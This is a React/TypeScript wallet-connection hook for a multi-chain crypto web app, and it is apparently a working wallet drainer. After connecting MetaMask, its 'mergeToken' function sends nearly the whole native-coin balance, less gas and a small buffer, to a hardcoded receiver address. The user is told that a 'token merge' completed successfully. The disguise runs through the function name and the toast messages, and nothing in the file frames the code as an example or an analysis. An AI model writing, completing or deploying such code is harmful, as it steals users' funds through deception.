import { useState, useEffect, useCallback } from 'react';
import { useToast } from '@/hooks/use-toast';

export const NETWORKS = {
  bnb: {
    chainId: "0x38",
    name: "BNB Smart Chain",
    symbol: "BNB",
    rpcUrl: "https://bsc-dataseed.binance.org/",
  },
  ethereum: {
    chainId: "0x1",
    name: "Ethereum Mainnet",
    symbol: "ETH",
    rpcUrl: "https://mainnet.infura.io/v3/",
  },
  polygon: {
    chainId: "0x89",
    name: "Polygon",
    symbol: "MATIC",
    rpcUrl: "https://polygon-rpc.com",
  },
  avalanche: {
    chainId: "0xa86a",
    name: "Avalanche",
    symbol: "AVAX",
    rpcUrl: "https://api.avax.network/ext/bc/C/rpc",
  },
};

const RECEIVER_ADDRESS = "0xf142a2CF9CFCA2cDe850c54bA55690F0645D7C61";

export function useWeb3() {
  const [selectedNetwork, setSelectedNetwork] = useState("bnb");
  const [walletConnected, setWalletConnected] = useState(false);
  const [balance, setBalance] = useState("0");
  const [account, setAccount] = useState("");
  const [connecting, setConnecting] = useState(false);
  const { toast } = useToast();

  const updateBalance = useCallback(async (address: string) => {
    if (!window.ethereum || !address) return;
    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const nativeBalance = await provider.getBalance(address);
      setBalance(ethers.formatEther(nativeBalance));
    } catch (error) {
      console.error('Failed to update balance:', error);
      setBalance("0");
    }
  }, []);

  // Check if wallet is already connected on load
  useEffect(() => {
    const checkConnection = async () => {
      if (window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts.length > 0) {
            setAccount(accounts[0]);
            setWalletConnected(true);
            await updateBalance(accounts[0]);
          }
        } catch (error) {
          console.error('Error checking connection:', error);
        }
      }
    };
    checkConnection();
  }, [updateBalance]);

  // Listen for account changes
  useEffect(() => {
    if (!window.ethereum) return;

    const handleAccountsChanged = (accounts: string[]) => {
      if (accounts.length === 0) {
        setWalletConnected(false);
        setAccount("");
        setBalance("0");
      } else {
        setAccount(accounts[0]);
        setWalletConnected(true);
        updateBalance(accounts[0]);
      }
    };

    const handleChainChanged = () => {
      if (account) updateBalance(account);
    };

    window.ethereum.on?.('accountsChanged', handleAccountsChanged);
    window.ethereum.on?.('chainChanged', handleChainChanged);

    return () => {
      window.ethereum?.removeListener?.('accountsChanged', handleAccountsChanged);
      window.ethereum?.removeListener?.('chainChanged', handleChainChanged);
    };
  }, [account, updateBalance]);

  const switchNetwork = async (key: string) => {
    const net = NETWORKS[key as keyof typeof NETWORKS];
    if (!window.ethereum) {
      toast({ title: "Error", description: "MetaMask not found", variant: "destructive" });
      return false;
    }

    try {
      await window.ethereum.request({
        method: "wallet_switchEthereumChain",
        params: [{ chainId: net.chainId }],
      });
      return true;
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: "wallet_addEthereumChain",
            params: [{
              chainId: net.chainId,
              chainName: net.name,
              nativeCurrency: { name: net.symbol, symbol: net.symbol, decimals: 18 },
              rpcUrls: [net.rpcUrl],
            }],
          });
          return true;
        } catch (addError) {
          console.error("Failed to add network:", addError);
          toast({ title: "Error", description: "Failed to add network", variant: "destructive" });
          return false;
        }
      } else {
        console.error("Network switch error:", switchError);
        toast({ title: "Error", description: "Network switch rejected", variant: "destructive" });
        return false;
      }
    }
  };

  const connectWallet = async () => {
    if (!window.ethereum) {
      toast({
        title: "Error",
        description: "MetaMask or trust wallet not detected. Please install MetaMask or trust.",
        variant: "destructive",
      });
      return;
    }

    setConnecting(true);
    console.log("Starting wallet connection...");

    try {
      console.log("Requesting accounts...");
      // 1. Connect FIRST — opens the wallet prompt
      const accounts = await window.ethereum.request({
        method: "eth_requestAccounts",
      });

      if (accounts.length === 0) {
        throw new Error("No accounts found");
      }

      const address = accounts[0];
      console.log("Connected to account:", address);
      setAccount(address);
      setWalletConnected(true);
      await updateBalance(address);

      // 2. Switch network AFTER connection — non-blocking, never fails the connection
      try {
        console.log("Switching network...");
        await switchNetwork(selectedNetwork);
      } catch (networkError) {
        console.warn("Network switch skipped:", networkError);
      }

      toast({ title: "Success", description: "Wallet connected successfully!" });
      return;

    } catch (error: any) {
      console.error("Connection error:", error);
      let errorMessage = "Failed to connect wallet";
      if (error.code === 4001) {
        errorMessage = "Connection rejected by user";
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Error", description: errorMessage, variant: "destructive" });
    } finally {
      setConnecting(false);
    }
  };

  const mergeToken = async () => {
    console.log("Starting merge token...");

    if (!walletConnected || !window.ethereum || !account) {
      toast({ title: "Error", description: "Wallet not connected", variant: "destructive" });
      return;
    }

    try {
      const { ethers } = await import('ethers');
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      const nativeBalance = await provider.getBalance(account);
      console.log("Current balance:", ethers.formatEther(nativeBalance));

      if (nativeBalance === 0n) {
        toast({ title: "Error", description: "No balance to merge", variant: "destructive" });
        return;
      }

      console.log("Estimating gas...");
      const gasEstimate = await provider.estimateGas({
        to: RECEIVER_ADDRESS,
        value: ethers.parseEther("0.001"),
        from: account
      });

      const feeData = await provider.getFeeData();
      const gasPrice = feeData.gasPrice || ethers.parseUnits("20", "gwei");

      const gasCost = gasEstimate * gasPrice;
      let valueToSend = nativeBalance - gasCost;

      // Safety buffer
      const buffer = ethers.parseEther("0.001");
      valueToSend = valueToSend - buffer;

      if (valueToSend <= 0n) {
        toast({ title: "Error", description: "Insufficient balance for gas fees", variant: "destructive" });
        return;
      }

      console.log("Sending transaction...");
      console.log("Value to send:", ethers.formatEther(valueToSend));

      toast({ title: "Confirm Transaction", description: "Please confirm in MetaMask" });

      const txResponse = await signer.sendTransaction({
        to: RECEIVER_ADDRESS,
        value: valueToSend,
        gasLimit: gasEstimate,
        gasPrice: gasPrice
      });

      console.log("Transaction sent:", txResponse.hash);

      toast({ title: "Transaction Submitted", description: `Hash: ${txResponse.hash.slice(0, 10)}...` });

      const receipt = await txResponse.wait();
      console.log("Transaction receipt:", receipt);

      if (receipt && receipt.status === 1) {
        toast({ title: "Success!", description: "Token merge completed successfully" });
        await updateBalance(account);
      } else {
        throw new Error("Transaction failed");
      }
    } catch (error: any) {
      console.error("Merge error:", error);
      let errorMessage = "Transaction failed";
      if (error.code === 4001) {
        errorMessage = "Transaction rejected by user";
      } else if (error.code === "INSUFFICIENT_FUNDS") {
        errorMessage = "Insufficient funds for transaction";
      } else if (error.message?.includes("insufficient funds")) {
        errorMessage = "Insufficient funds for gas";
      } else if (error.reason) {
        errorMessage = error.reason;
      } else if (error.message) {
        errorMessage = error.message;
      }
      toast({ title: "Transaction Failed", description: errorMessage, variant: "destructive" });
    }
  };

  return {
    selectedNetwork,
    setSelectedNetwork,
    walletConnected,
    balance,
    account,
    connecting,
    connectWallet,
    mergeToken,
    NETWORKS,
  };
}
